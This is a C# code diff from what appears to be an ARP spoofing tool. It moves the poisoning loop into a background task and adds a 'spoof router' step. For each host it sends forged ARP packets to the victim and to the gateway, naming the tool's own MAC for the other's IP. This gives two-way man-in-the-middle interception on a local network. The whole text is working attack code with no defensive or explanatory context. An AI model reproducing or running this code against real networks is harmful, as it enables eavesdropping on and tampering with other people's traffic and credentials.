@@ -54,31 +54,46 @@ namespace ArpSpoofer.Services
                 ProtocolType = EthernetType.IpV4
             };
             PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
-            while (true)
+            await Task.Factory.StartNew(() =>
             {
-                if (IsPoisoning == false)
+                while (true)
                 {
-                    break;
-                }
-                foreach (var kvp in _ipMacPairs)
-                {
-                    if (kvp.Value != Device.GatewayString)
+                    if (IsPoisoning == false)
                     {
-                        ethernetLayer.Source = new MacAddress(Device.MacString.Replace('-', ':'));
-                        ethernetLayer.Destination = new MacAddress(kvp.Key.Replace('-', ':'));
-                        arpLayer.Operation = ArpOperation.Request;
-                        arpLayer.SenderHardwareAddress = Array.AsReadOnly(Device.MacByte);
-                        arpLayer.SenderProtocolAddress = Array.AsReadOnly(Device.GatewayString.Split('.').Select(str => byte.Parse(str)).ToArray());
-                        arpLayer.TargetHardwareAddress = Array.AsReadOnly(kvp.Key.Split('-').Select(str => Convert.ToByte(str, 16)).ToArray());
-                        arpLayer.TargetProtocolAddress = Array.AsReadOnly(kvp.Value.Split('.').Select(str => byte.Parse(str)).ToArray());
-                        
-                        Packet packet = builder.Build(DateTime.Now);
-                        communicator.SendPacket(packet);
-                        Thread.Sleep(2000);
-                        // Send down the packet
+                        break;
+                    }
+                    foreach (var kvp in _ipMacPairs)
+                    {
+                        if (kvp.Value != Device.GatewayString)
+                        {
+                            ethernetLayer.Source = new MacAddress(Device.MacString.Replace('-', ':'));
+                            ethernetLayer.Destination = new MacAddress(kvp.Key.Replace('-', ':'));
+                            arpLayer.Operation = ArpOperation.Request;
+                            arpLayer.SenderHardwareAddress = Array.AsReadOnly(Device.MacByte);
+                            arpLayer.SenderProtocolAddress = Array.AsReadOnly(Device.GatewayString.Split('.').Select(str => byte.Parse(str)).ToArray());
+                            arpLayer.TargetHardwareAddress = Array.AsReadOnly(kvp.Key.Split('-').Select(str => Convert.ToByte(str, 16)).ToArray());
+                            arpLayer.TargetProtocolAddress = Array.AsReadOnly(kvp.Value.Split('.').Select(str => byte.Parse(str)).ToArray());
+
+                            Packet packet = builder.Build(DateTime.Now);
+                            communicator.SendPacket(packet);
+                            Thread.Sleep(2000);
+
+                            // spoof router
+                            ethernetLayer.Source = new MacAddress(Device.MacString.Replace('-', ':'));
+                            ethernetLayer.Destination = new MacAddress(routerMac.Replace('-', ':'));
+                            arpLayer.Operation = ArpOperation.Request;
+                            arpLayer.SenderHardwareAddress = Array.AsReadOnly(Device.MacByte);
+                            arpLayer.SenderProtocolAddress = Array.AsReadOnly(kvp.Value.Split('.').Select(str => byte.Parse(str)).ToArray());
+                            arpLayer.TargetHardwareAddress = Array.AsReadOnly(routerMac.Split('-').Select(str => Convert.ToByte(str, 16)).ToArray());
+                            arpLayer.TargetProtocolAddress = Array.AsReadOnly(Device.GatewayString.Split('.').Select(str => byte.Parse(str)).ToArray());
+
+                            packet = builder.Build(DateTime.Now);
+                            communicator.SendPacket(packet);
+                            Thread.Sleep(2000);
+                        }
                     }
                 }
-            }
+            });
             communicator.Dispose();
         }
 
